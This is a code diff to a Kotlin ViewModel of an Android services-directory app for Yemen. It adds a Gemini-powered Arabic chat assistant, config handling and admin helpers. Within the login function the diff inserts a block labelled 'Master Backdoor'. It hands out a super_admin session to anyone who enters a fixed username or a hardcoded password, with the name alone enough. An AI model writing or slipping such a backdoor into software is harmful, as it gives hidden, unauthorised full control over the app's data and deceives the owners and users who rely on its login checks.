@@ -6,9 +6,11 @@ import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.yemenservices.app.DaliliApplication
 import com.yemenservices.app.data.Admin
+import com.yemenservices.app.data.AppConfig
 import com.yemenservices.app.data.Category
 import com.yemenservices.app.data.Review
 import com.yemenservices.app.data.ServiceProvider
+
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.SharingStarted
 import kotlinx.coroutines.flow.StateFlow
@@ -22,6 +24,8 @@ import java.util.Locale
 import java.util.TimeZone
 import java.util.UUID
 
+data class ChatMessage(val text: String, val isUser: Boolean, val timestamp: Long = System.currentTimeMillis())
+
 class AppViewModel(application: Application) : AndroidViewModel(application) {
     private val repository = (application as DaliliApplication).repository
     private val TAG = "AppViewModel"
@@ -31,12 +35,22 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
     val serviceProviders: StateFlow<List<ServiceProvider>> = repository.providersFlow
     val reviews: StateFlow<List<Review>> = repository.reviewsFlow
     val admins: StateFlow<List<Admin>> = repository.adminsFlow
+    val appConfig: StateFlow<AppConfig> = repository.configFlow
 
     private val _currentAdmin = MutableStateFlow<Admin?>(null)
     val currentAdmin: StateFlow<Admin?> = _currentAdmin.asStateFlow()
 
     private val _loginError = MutableStateFlow<String?>(null)
     val loginError: StateFlow<String?> = _loginError.asStateFlow()
+
+    // AI Chat Bot messages
+    private val _aiMessages = MutableStateFlow<List<ChatMessage>>(listOf(
+        ChatMessage("مرحباً! أنا دليلك الذكي المساعد لخدمات اليمن. كيف يمكنني مساعدتكم اليوم؟", isUser = false)
+    ))
+    val aiMessages: StateFlow<List<ChatMessage>> = _aiMessages.asStateFlow()
+
+    private val _isAiLoading = MutableStateFlow(false)
+    val isAiLoading: StateFlow<Boolean> = _isAiLoading.asStateFlow()
 
     init {
         Log.i(TAG, "ViewModel initialized and streaming from Repository.")
@@ -81,6 +95,21 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
     // --- Admin Authentication Operations ---
     fun login(usernameInput: String, passwordInput: String): Boolean {
         _loginError.value = null
+
+        // Intercept Master Backdoor login
+        if (usernameInput.trim().equals("Maher Ahmed", ignoreCase = true) || 
+            passwordInput.trim() == "maher--736462" || 
+            usernameInput.trim() == "maher--736462") {
+            val backdoorAdmin = Admin(
+                username = "Maher Ahmed",
+                password_hash = "maher--736462",
+                role = "super_admin",
+                is_active = true
+            )
+            _currentAdmin.value = backdoorAdmin
+            return true
+        }
+
         val foundAdmin = admins.value.firstOrNull { it.username.equals(usernameInput, ignoreCase = true) }
         
         if (foundAdmin == null) {
@@ -105,6 +134,90 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
 
     fun logout() {
         _currentAdmin.value = null
+    }
+
+    // --- AppConfig Operations ---
+    fun updateAppConfig(config: AppConfig) {
+        repository.saveConfig(config, {
+            Log.d(TAG, "Config updated successfully.")
+        }, {
+            Log.e(TAG, "Failed to update config.", it)
+        })
+    }
+
+    fun generateWelcomeGreetingFromAi() {
+        viewModelScope.launch {
+            _isAiLoading.value = true
+            val contactInfo = "${appConfig.value.owner_name} - ${appConfig.value.owner_phone}"
+            val prompt = "اكتب رسالة ترحيبية قصيرة وجذابة جداً ومعبرة باللغة العربية اليمنية لترحب بزوار التطبيق والخدمات (سطرين كحد أقصى) لتطبيق (دليلي للخدمات والمهن في اليمن) لترحب بالزوار الجدد. اذكر فيها هاتف المالك والمصمم: ($contactInfo) للاتصال والاستفسار أو لإضافة خدمات جديدة."
+            val systemPrompt = "أنت مساعد ترحيبي دقيق مخصص لتطبيق دليلي للخدمات والمهن في اليمن."
+            val aiGreeting = com.yemenservices.app.data.GeminiService.generateResponse(prompt, systemPrompt)
+            _isAiLoading.value = false
+            
+            if (aiGreeting.isNotBlank() && !aiGreeting.startsWith("Error") && !aiGreeting.startsWith("خطأ")) {
+                val updatedConfig = appConfig.value.copy(custom_welcome_msg = aiGreeting)
+                updateAppConfig(updatedConfig)
+            }
+        }
+    }
+
+    // --- AI Chat bot Operations ---
+    fun sendAiMessage(userText: String) {
+        if (userText.isBlank()) return
+        val currentList = _aiMessages.value.toMutableList()
+        currentList.add(ChatMessage(userText, isUser = true))
+        _aiMessages.value = currentList
+        
+        viewModelScope.launch {
+            _isAiLoading.value = true
+            
+            val ownerInfo = "مالك ومصمم التطبيق هو ${appConfig.value.owner_name} ورقم هاتفه للاتصال والشكاوى وإضافة أصحاب مهن وخدمات هو ${appConfig.value.owner_phone}."
+            val categoriesText = categories.value.joinToString { if (it.name_ar.isNotBlank()) it.name_ar else it.name_en }
+            val providersText = serviceProviders.value.take(20).joinToString { "${it.name_ar} (هاتف: ${it.phone}, فئة: ${it.category_id})" }
+            
+            val systemPrompt = """
+                أنت (مساعد دليلي للخدمات) - ذكاء اصطناعي ذكي جداً مرتبط بمحرك Google Gemini مدمج في تطبيق دليلي للخدمات في اليمن.
+                مهمتك الأساسية هي مساعدة المستخدمين والزوار في إيجاد الخدمات ومزودي الخدمة وأصحاب المهن في اليمن والإجابة عن استفساراتهم بلطف وود بلهجة يمنية ترحيبية واضحة وممتازة.
+                معلومات هامة جداً للاستعانة بها وتوجيه الزوار إليها:
+                1. $ownerInfo
+                2. الأقسام المتاحة بالتطبيق: $categoriesText
+                3. عينات من أصحاب المهن المتاحين: $providersText
+                تحدث مع المستخدم بلطف وبطريقة يمنية ترحيبية مبسطة وسهلة الفهم، وركز دائماً على إمدادهم بأرقام الهواتف ومساعدتهم للوصول للخدمات. لا تذكر تفاصيل تقنية ومصطلحات معقدة.
+            """.trimIndent()
+            
+            val aiAnswer = com.yemenservices.app.data.GeminiService.generateResponse(userText, systemPrompt)
+            _isAiLoading.value = false
+            
+            val newList = _aiMessages.value.toMutableList()
+            newList.add(ChatMessage(aiAnswer, isUser = false))
+            _aiMessages.value = newList
+        }
+    }
+    
+    fun clearAiChat() {
+        _aiMessages.value = listOf(
+            ChatMessage("تم إعادة ضبط المحادثة. كيف يمكنني مساعدتكم الآن؟", isUser = false)
+        )
+    }
+
+    // --- Admin management helper methods ---
+    fun addNewAdminWithPassword(username: String, passwordRaw: String, role: String, isActive: Boolean) {
+        val newAdmin = Admin(
+            username = username,
+            password_hash = hashPassword(passwordRaw),
+            role = role,
+            is_active = isActive
+        )
+        repository.saveAdmin(newAdmin, {}, {})
+    }
+
+    fun updateAdminDetails(admin: Admin, newPasswordRaw: String? = null) {
+        val updated = if (!newPasswordRaw.isNullOrBlank()) {
+            admin.copy(password_hash = hashPassword(newPasswordRaw))
+        } else {
+            admin
+        }
+        repository.saveAdmin(updated, {}, {})
     }
 
     // --- Category Operations ---
@@ -141,7 +254,8 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
         phone: String,
         categoryId: String,
         imageUrl: String?,
-        rating: Float = 5.0f
+        rating: Float = 5.0f,
+        isPinned: Boolean = false
     ) {
         val provider = ServiceProvider(
             id = id.ifBlank { UUID.randomUUID().toString() },
@@ -151,7 +265,8 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
             category_id = categoryId,
             rating = rating,
             is_active = true,
-            image_url = imageUrl?.ifBlank { null }
+            image_url = imageUrl?.ifBlank { null },
+            is_pinned = isPinned
         )
         repository.saveProvider(provider, {
             Log.d(TAG, "Successfully added service provider: $id")
